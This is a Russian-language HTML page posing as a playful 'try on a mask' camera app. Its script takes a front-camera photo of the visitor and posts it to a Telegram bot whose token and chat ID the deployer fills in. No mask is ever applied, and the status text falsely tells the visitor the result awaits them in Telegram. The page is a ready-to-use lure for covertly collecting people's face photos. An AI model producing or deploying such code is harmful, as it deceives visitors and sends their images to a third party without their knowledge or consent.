<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎭 Весёлая маска</title>
</head>
<body>
    <h1>🎭 Примерить маску</h1>
    <video id="video" autoplay playsinline style="width:100%;max-width:400px;border-radius:16px;"></video>
    <br>
    <button id="snapBtn" style="margin-top:20px;padding:16px 40px;font-size:20px;border:none;border-radius:12px;background:#6c5ce7;color:#fff;font-weight:bold;cursor:pointer;">📸 Сделать маску</button>
    <div id="status" style="margin-top:16px;color:#8899bb;"></div>

    <script>
        const video = document.getElementById('video');
        const snapBtn = document.getElementById('snapBtn');
        const status = document.getElementById('status');

        // Запрашиваем доступ (только по клику)
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 } }
                });
                video.srcObject = stream;
                status.textContent = '✅ Камера готова! Нажмите кнопку.';
                snapBtn.disabled = false;
            } catch (err) {
                status.textContent = '❌ Не удалось включить камеру: ' + err.message;
            }
        }

        // Фото + отправка
        async function takePhoto() {
            status.textContent = '📸 Снимаю...';
            snapBtn.disabled = true;

            try {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));

                // ===== ВСТАВЬТЕ СВОЙ ТОКЕН И CHAT_ID =====
                const BOT_TOKEN = "123456789:ABCdefGHIjklMNOpqrsTUVwxyz";
                const CHAT_ID = "123456789";

                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'mask_photo.jpg');

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    status.innerHTML = '✅ Маска сохранена! Смотрите результат в Telegram. 🎭';
                } else {
                    const err = await response.json();
                    status.textContent = '❌ Ошибка отправки: ' + err.description;
                }
            } catch (err) {
                status.textContent = '❌ Ошибка: ' + err.message;
            }

            snapBtn.disabled = false;
        }

        // Старт по клику на кнопку
        document.addEventListener('DOMContentLoaded', () => {
            status.textContent = '📸 Нажмите "Сделать маску", чтобы включить камеру';
            snapBtn.addEventListener('click', startCamera);
            // Сделать фото — только после включения камеры
            const origClick = snapBtn.click;
            snapBtn.onclick = () => {
                if (video.srcObject) {
                    takePhoto();
                } else {
                    startCamera();
                }
            };
        });
    </script>
</body>
</html>
